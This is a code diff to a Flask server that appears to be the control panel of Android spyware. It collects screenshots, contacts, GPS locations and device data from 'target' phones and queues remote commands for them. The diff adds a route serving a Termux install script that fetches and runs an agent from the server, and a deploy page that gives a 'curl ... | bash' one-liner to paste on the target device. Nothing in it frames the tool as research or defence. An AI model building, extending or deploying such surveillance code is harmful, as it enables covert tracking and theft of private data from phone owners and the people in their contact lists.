@@ -1,10 +1,7 @@
-from flask import Flask, request, jsonify, session, redirect, render_template, Response, send_file, render_template_string
+from flask import Flask, request, jsonify, session, redirect, render_template, Response, send_file
 import sqlite3
 from datetime import datetime
-import os
-import random
-import io
-import json
+import os, io
 import time
 import base64
 from threading import Lock
@@ -30,7 +27,7 @@ def init_database():
         conn = sqlite3.connect('mp_agent.db')
         cursor = conn.cursor()
         
-        # Drop all old tables to remove fake data
+        # Drop all old tables to remove any fake data structures
         cursor.execute("DROP TABLE IF EXISTS agents")
         cursor.execute("DROP TABLE IF EXISTS screenshots")
         cursor.execute("DROP TABLE IF EXISTS contacts")
@@ -38,7 +35,7 @@ def init_database():
         cursor.execute("DROP TABLE IF EXISTS commands")
         cursor.execute("DROP TABLE IF EXISTS system_logs")
         
-        # Create fresh tables
+        # Create fresh tables for REAL DATA ONLY
         cursor.execute('''
             CREATE TABLE agents (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -52,7 +49,8 @@ def init_database():
                 screenshot_count INTEGER DEFAULT 0,
                 battery_level INTEGER,
                 last_screenshot DATETIME,
-                user_agent TEXT
+                user_agent TEXT,
+                is_real_device BOOLEAN DEFAULT 0
             )
         ''')
         
@@ -62,6 +60,7 @@ def init_database():
                 agent_id TEXT,
                 screenshot_data BLOB,
                 timestamp DATETIME,
+                is_real BOOLEAN DEFAULT 1,
                 FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
             )
         ''')
@@ -73,6 +72,7 @@ def init_database():
                 contact_name TEXT,
                 phone_number TEXT,
                 timestamp DATETIME,
+                is_real BOOLEAN DEFAULT 1,
                 FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
             )
         ''')
@@ -86,6 +86,7 @@ def init_database():
                 accuracy REAL,
                 address TEXT,
                 timestamp DATETIME,
+                is_real BOOLEAN DEFAULT 1,
                 FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
             )
         ''')
@@ -112,7 +113,7 @@ def init_database():
         
         conn.commit()
         conn.close()
-        logger.info("✅ FRESH database created - ALL fake data removed")
+        logger.info("✅ FRESH database created - REAL DATA ONLY system ready")
 
 def get_db_connection():
     try:
@@ -188,10 +189,12 @@ def login():
             .login-container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
             .logo { text-align: center; margin-bottom: 30px; }
             .logo h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
+            .logo p { color: #666; font-size: 14px; }
             .form-group { margin-bottom: 20px; }
             .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
             .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 14px; }
             .btn-login { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
+            .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; border-radius: 5px; margin-bottom: 20px; font-size: 12px; color: #856404; }
         </style>
     </head>
     <body>
@@ -199,6 +202,9 @@ def login():
             <div class="logo">
                 <h1>🔐 MP_AGENT PLATFORM</h1>
                 <p>REAL DATA ONLY - No Fake Data</p>
+            </div>
+            <div class="warning">
+                <strong>⚠️ IMPORTANT:</strong> This system collects ONLY actual data from real Android devices. No fake data will be generated or stored.
             </div>
             <form method="POST" action="/login">
                 <div class="form-group">
@@ -225,22 +231,22 @@ def dashboard():
         conn = get_db_connection()
         
         stats = {
-            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
-            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
-            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0],
+            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active' AND is_real_device=1").fetchone()[0],
+            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots WHERE is_real=1").fetchone()[0],
+            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts WHERE is_real=1").fetchone()[0],
+            'total_locations': conn.execute("SELECT COUNT(*) FROM locations WHERE is_real=1").fetchone()[0],
             'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
         }
         
-        agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC"))
+        agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE is_real_device=1 AND status='active' ORDER BY last_seen DESC"))
         screenshots = safe_fetchall(conn.execute('''
             SELECT s.*, a.phone_model FROM screenshots s 
             LEFT JOIN agents a ON s.agent_id = a.agent_id 
-            WHERE s.screenshot_data IS NOT NULL 
+            WHERE s.is_real=1 AND s.screenshot_data IS NOT NULL 
             ORDER BY s.timestamp DESC LIMIT 12
         '''))
-        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 20"))
-        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 10"))
+        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts WHERE is_real=1 ORDER BY timestamp DESC LIMIT 20"))
+        locations = safe_fetchall(conn.execute("SELECT * FROM locations WHERE is_real=1 ORDER BY timestamp DESC LIMIT 10"))
         
         conn.close()
     
@@ -261,22 +267,22 @@ def admin_dashboard():
         conn = get_db_connection()
         
         stats = {
-            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
-            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
-            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0],
+            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active' AND is_real_device=1").fetchone()[0],
+            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots WHERE is_real=1").fetchone()[0],
+            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts WHERE is_real=1").fetchone()[0],
+            'total_locations': conn.execute("SELECT COUNT(*) FROM locations WHERE is_real=1").fetchone()[0],
             'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
         }
         
-        agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
+        agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE is_real_device=1 ORDER BY last_seen DESC"))
         screenshots = safe_fetchall(conn.execute('''
             SELECT s.*, a.phone_model FROM screenshots s 
             LEFT JOIN agents a ON s.agent_id = a.agent_id 
-            WHERE s.screenshot_data IS NOT NULL 
+            WHERE s.is_real=1 AND s.screenshot_data IS NOT NULL 
             ORDER BY s.timestamp DESC LIMIT 16
         '''))
-        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 25"))
-        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 15"))
+        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts WHERE is_real=1 ORDER BY timestamp DESC LIMIT 25"))
+        locations = safe_fetchall(conn.execute("SELECT * FROM locations WHERE is_real=1 ORDER BY timestamp DESC LIMIT 15"))
         commands = safe_fetchall(conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10"))
         logs = safe_fetchall(conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20"))
         
@@ -292,10 +298,73 @@ def admin_dashboard():
                          logs=logs,
                          platform_url=request.host_url.rstrip('/'))
 
-# ==================== AGENT API ROUTES ====================
+# ==================== AGENT DOWNLOAD ROUTE ====================
+
+@app.route('/download_agent')
+def download_agent():
+    """Serve the REAL agent installation script"""
+    phone = request.args.get('phone', 'unknown')
+    
+    platform_url = request.host_url.rstrip('/')
+    
+    agent_script = f'''#!/bin/bash
+echo "🔍 MP Agent Installation Starting..."
+echo "📱 Target: {phone}"
+echo "🌐 Server: {platform_url}"
+echo "⚠️  COLLECTING ACTUAL DEVICE DATA ONLY - NO FAKE DATA"
+
+# Check if running on Android/Termux
+if [ ! -d "/data/data/com.termux" ]; then
+    echo "❌ ERROR: This script must run in Termux on Android"
+    echo "💡 Install Termux from: https://f-droid.org/en/packages/com.termux/"
+    exit 1
+fi
+
+echo "✅ Termux environment detected"
+echo "📦 Installing required packages..."
+
+# Update and install dependencies
+pkg update -y && pkg upgrade -y
+pkg install -y python python-pip curl wget termux-api
+
+echo "🐍 Installing Python dependencies..."
+pip install requests pillow
+
+# Create agent directory
+AGENT_DIR="$HOME/mp_agent"
+mkdir -p "$AGENT_DIR"
+cd "$AGENT_DIR"
+
+# Download the actual agent script
+echo "📥 Downloading agent components..."
+AGENT_URL="{platform_url}/static/real_agent.py"
+curl -s "$AGENT_URL" -o real_agent.py
+
+if [ -f "real_agent.py" ]; then
+    echo "✅ Agent downloaded successfully"
+    echo "🚀 Starting REAL data collection agent..."
+    echo "📊 This will collect ACTUAL data from this device only"
+    python real_agent.py --agent-id {phone} --server {platform_url}
+else
+    echo "❌ Failed to download agent script"
+    echo "🔧 Please check the server status and try again"
+    exit 1
+fi
+'''
+
+    log_event('INFO', f'REAL agent download requested for: {phone}')
+    
+    return Response(
+        agent_script,
+        mimetype='text/x-shellscript',
+        headers={'Content-Disposition': f'attachment; filename=mp_agent_{phone}.sh'}
+    )
+
+# ==================== REAL AGENT API ROUTES ====================
 
 @app.route('/api/agent/register', methods=['POST'])
 def register_agent():
+    """Register ONLY real devices - NO FAKE DATA"""
     try:
         data = request.get_json()
         if not data:
@@ -307,7 +376,7 @@ def register_agent():
         ip_address = request.remote_addr
         user_agent = request.headers.get('User-Agent', 'Unknown')
         
-        logger.info(f"🔍 NEW AGENT REGISTRATION: {agent_id} from {ip_address}")
+        logger.info(f"🔍 REAL DEVICE REGISTRATION: {agent_id} from {ip_address}")
         
         if not agent_id:
             return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
@@ -325,15 +394,15 @@ def register_agent():
                 conn.execute('''
                     UPDATE agents SET 
                     phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
-                    status = 'active', last_seen = ?
+                    status = 'active', last_seen = ?, is_real_device = 1
                     WHERE agent_id = ?
                 ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
                 action = "updated"
             else:
                 conn.execute('''
                     INSERT INTO agents 
-                    (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
-                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
+                    (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen, is_real_device)
+                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?, 1)
                 ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
                 action = "registered"
             
@@ -344,23 +413,23 @@ def register_agent():
             ))
             conn.close()
         
-        log_event('INFO', f'NEW AGENT {action}: {agent_id} from {ip_address}')
+        log_event('INFO', f'REAL DEVICE {action}: {agent_id} from {ip_address}')
         
         commands_list = [cmd['command'] for cmd in pending_commands]
         
         return jsonify({
             'status': 'success', 
-            'message': f'Agent {action} successfully',
+            'message': f'Real device {action} successfully',
             'pending_commands': commands_list
         })
         
     except Exception as e:
-        logger.error(f"❌ Agent registration failed: {e}")
+        logger.error(f"❌ Real device registration failed: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/agent/submit_report', methods=['POST'])
 def submit_report():
-    """Receive ONLY REAL data reports from agents - NO FAKE DATA"""
+    """Receive ONLY REAL data reports from actual devices - NO FAKE DATA"""
     try:
         data = request.get_json()
         if not data:
@@ -390,12 +459,12 @@ def submit_report():
                         
                         screenshot_binary = base64.b64decode(image_data)
                         conn.execute(
-                            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
+                            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp, is_real) VALUES (?, ?, ?, 1)',
                             (agent_id, screenshot_binary, current_time)
                         )
                         logger.info(f"✅ REAL screenshot stored from {agent_id}")
                     except Exception as e:
-                        logger.error(f"❌ Failed to store screenshot: {e}")
+                        logger.error(f"❌ Failed to store real screenshot: {e}")
                 
                 conn.execute(
                     'UPDATE agents SET last_seen = ?, last_screenshot = ?, screenshot_count = screenshot_count + 1, status = "active" WHERE agent_id = ?',
@@ -409,15 +478,15 @@ def submit_report():
                 accuracy = report_data.get('accuracy')
                 address = report_data.get('address', '')
                 
-                # Only store if we have valid coordinates
-                if latitude and longitude and latitude != 0.0 and longitude != 0.0:
+                # Only store if we have valid coordinates (not 0,0)
+                if latitude and longitude and abs(latitude) > 0.001 and abs(longitude) > 0.001:
                     conn.execute(
-                        'INSERT INTO locations (agent_id, latitude, longitude, accuracy, address, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
+                        'INSERT INTO locations (agent_id, latitude, longitude, accuracy, address, timestamp, is_real) VALUES (?, ?, ?, ?, ?, ?, 1)',
                         (agent_id, latitude, longitude, accuracy, address, current_time)
                     )
                     logger.info(f"📍 REAL location stored from {agent_id}: {latitude}, {longitude}")
                 else:
-                    logger.warning(f"⚠ Invalid location data from {agent_id}")
+                    logger.warning(f"⚠ Invalid/zero location data from {agent_id} - NOT stored")
                 
                 conn.execute(
                     'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
@@ -433,10 +502,10 @@ def submit_report():
                     name = contact.get('name', '').strip()
                     phone = contact.get('phone', '').strip()
                     
-                    # Only store if we have valid contact data (not fake)
-                    if name and phone and name != 'Unknown' and phone != 'Unknown':
+                    # Only store if we have valid contact data (not empty/fake)
+                    if name and phone and len(name) > 1 and len(phone) > 5:
                         conn.execute(
-                            'INSERT INTO contacts (agent_id, contact_name, phone_number, timestamp) VALUES (?, ?, ?, ?)',
+                            'INSERT INTO contacts (agent_id, contact_name, phone_number, timestamp, is_real) VALUES (?, ?, ?, ?, 1)',
                             (agent_id, name, phone, current_time)
                         )
                         real_contacts_count += 1
@@ -448,21 +517,24 @@ def submit_report():
                 )
                 
             elif report_type == 'device_info':
-                # Update device information
+                # Update REAL device information
                 battery = report_data.get('battery', 0)
+                phone_model = report_data.get('phone_model', '')
+                android_version = report_data.get('android_version', '')
+                
                 conn.execute(
-                    'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
-                    (current_time, battery, agent_id)
+                    'UPDATE agents SET last_seen = ?, battery_level = ?, phone_model = ?, android_version = ?, status = "active" WHERE agent_id = ?',
+                    (current_time, battery, phone_model, android_version, agent_id)
                 )
                 logger.info(f"📱 REAL device info updated for {agent_id}")
                 
             elif report_type == 'heartbeat':
-                # Simple heartbeat
+                # Simple heartbeat - mark as real device
                 conn.execute(
-                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+                    'UPDATE agents SET last_seen = ?, status = "active", is_real_device = 1 WHERE agent_id = ?',
                     (current_time, agent_id)
                 )
-                logger.info(f"💓 Heartbeat from {agent_id}")
+                logger.info(f"💓 Heartbeat from REAL device {agent_id}")
             
             conn.commit()
             conn.close()
@@ -471,7 +543,7 @@ def submit_report():
         return jsonify({'status': 'success', 'message': 'Real data received successfully'})
         
     except Exception as e:
-        logger.error(f"❌ Report submission failed: {e}")
+        logger.error(f"❌ Real data submission failed: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/agent/check_commands/<agent_id>')
@@ -503,7 +575,7 @@ def command_result():
             conn.commit()
             conn.close()
         
-        logger.info(f"✅ Command {command_id} completed: {result}")
+        logger.info(f"✅ Command {command_id} completed with REAL data")
         return jsonify({'status': 'success'})
         
     except Exception as e:
@@ -518,18 +590,18 @@ def serve_screenshot(screenshot_id):
     with db_lock:
         conn = get_db_connection()
         screenshot = safe_fetchone(conn.execute(
-            "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
+            "SELECT screenshot_data FROM screenshots WHERE id = ? AND is_real=1", (screenshot_id,)
         ))
         conn.close()
     
     if screenshot and screenshot['screenshot_data']:
         return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
     
-    # Return placeholder for real system
+    # Return error image for missing real screenshot
     from PIL import Image, ImageDraw
     img = Image.new('RGB', (400, 300), color='#1a1a1a')
     d = ImageDraw.Draw(img)
-    d.text((100, 150), "REAL SCREENSHOT DATA", fill='white')
+    d.text((100, 140), "REAL SCREENSHOT NOT AVAILABLE", fill='white')
     img_io = io.BytesIO()
     img.save(img_io, 'JPEG')
     img_io.seek(0)
@@ -560,7 +632,7 @@ def send_command():
     log_event('INFO', f'REAL command sent to {agent_id}: {command}')
     return redirect('/admin')
 
-# ==================== DEPLOYMENT ROUTE (FIXED) ====================
+# ==================== DEPLOYMENT ROUTE ====================
 
 @app.route('/deploy', methods=['POST'])
 def deploy_agent():
@@ -568,12 +640,12 @@ def deploy_agent():
         return redirect('/login')
     
     target_phone = request.form.get('phone_number')
-    agent_id = request.form.get('agent_id', f'actual_{target_phone}')
+    agent_id = request.form.get('agent_id', f'real_{target_phone}')
     
     platform_url = request.host_url.rstrip('/')
     agent_command = f"curl -s {platform_url}/download_agent?phone={agent_id} | bash"
     
-    # Check if agent already exists before inserting
+    # Mark as real device deployment
     with db_lock:
         conn = get_db_connection()
         existing_agent = safe_fetchone(conn.execute(
@@ -582,21 +654,21 @@ def deploy_agent():
         
         if not existing_agent:
             conn.execute(
-                'INSERT INTO agents (agent_id, status, first_seen, last_seen) VALUES (?, ?, ?, ?)',
-                (agent_id, 'deployed', datetime.now(), datetime.now())
+                'INSERT INTO agents (agent_id, status, first_seen, last_seen, is_real_device) VALUES (?, ?, ?, ?, 1)',
+                (agent_id, 'deployed', datetime.now(), datetime.now(), 1)
             )
             conn.commit()
-            log_event('INFO', f'New agent deployment: {agent_id}')
+            log_event('INFO', f'REAL agent deployment: {agent_id}')
         else:
-            log_event('INFO', f'Agent already exists: {agent_id}')
+            log_event('INFO', f'Real agent already exists: {agent_id}')
         
         conn.close()
     
     return f'''
     <html>
-    <head><title>Deploy Actual Data Agent</title></head>
+    <head><title>Deploy Real Data Agent</title></head>
     <body style="font-family: Arial; padding: 20px; background: #1a1a1a; color: white;">
-        <h1>🎯 Deploy ACTUAL DATA Agent</h1>
+        <h1>🎯 Deploy REAL DATA Agent</h1>
         <div style="background: #2d2d2d; padding: 20px; border-radius: 10px;">
             <h3>📱 Agent ID: {agent_id}</h3>
             <p>This agent collects <strong>ONLY ACTUAL DEVICE DATA</strong>:</p>
@@ -606,9 +678,12 @@ def deploy_agent():
                 <li>🔋 Actual Battery Status</li>
                 <li>📍 Actual Location (if available)</li>
                 <li>📖 Actual Contacts (if accessible)</li>
+                <li>🖥️ Actual Screenshots (if permitted)</li>
             </ul>
             
-            <p style="color: #f44336; font-weight: bold;">🚫 NO FAKE DATA WILL BE SENT</p>
+            <div style="background: #155724; padding: 15px; border-radius: 5px; margin: 15px 0;">
+                <strong>✅ REAL DATA GUARANTEE:</strong> No fake data will be generated or stored. Everything you see will be from the actual target device.
+            </div>
             
             <h3>🚀 Installation Command:</h3>
             <div style="background: #000; padding: 15px; border-radius: 5px; font-family: monospace;">
@@ -616,7 +691,7 @@ def deploy_agent():
             </div>
             
             <p style="margin-top: 20px;">
-                <strong>Copy and paste this command in Termux on the target device.</strong>
+                <strong>Copy and paste this command in Termux on the target Android device.</strong>
             </p>
             
             <a href="/admin" style="background: #667eea; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">
